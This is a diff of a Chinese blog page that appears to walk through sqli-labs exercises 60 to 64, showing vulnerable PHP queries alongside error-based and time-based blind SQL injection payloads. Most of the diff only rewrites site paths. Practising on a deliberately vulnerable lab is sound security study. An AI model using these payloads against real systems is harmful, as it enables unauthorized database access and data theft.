 <p>不用闭合的报错注入</p>
 <h1 id="less60"><a href="#less60" class="headerlink" title="less60"></a>less60</h1><p>闭合双引号括号的报错注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>id=-1&quot;) and extractvalue(1,concat(0x5c,database())) --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908113600319.png" alt="image-20220908113600319"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908113600319.png" alt="image-20220908113600319"></p>
 <h1 id="less61"><a href="#less61" class="headerlink" title="less61"></a>less61</h1><p>闭合单引号双括号的报错注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
@@ -669,11 +669,11 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>id=1&#39;) and if(substr((select database()),1,1)=&#39;c&#39;,sleep(3),1) --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114412114.png" alt="image-20220908114412114"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114412114.png" alt="image-20220908114412114"></p>
 <h1 id="less63"><a href="#less63" class="headerlink" title="less63"></a>less63</h1><p>不报错的，闭合单引号的时间盲注</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(substr((select database()),1,1)=&#x27;c&#x27;,sleep(3),1) --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114513361.png" alt="image-20220908114513361"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114513361.png" alt="image-20220908114513361"></p>
 <h1 id="less64"><a href="#less64" class="headerlink" title="less64"></a>less64</h1><p>不报错的，闭合双括号的时间盲注</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1)) and if(substr((select database()),1,1)=&#x27;c&#x27;,sleep(3),1) --+</span><br></pre></td></tr></table></figure>
 
@@ -702,11 +702,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/09/07/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" rel="prev" title="通达oa漏洞合集">
+    <a href="/2022/09/07/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" rel="prev" title="通达oa漏洞合集">
       <i class="fa fa-chevron-left"></i> 通达oa漏洞合集
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/" rel="next" title="内网渗透端口转发总结">
+    <a href="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/" rel="next" title="内网渗透端口转发总结">
       内网渗透端口转发总结 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -774,14 +774,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -842,48 +842,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
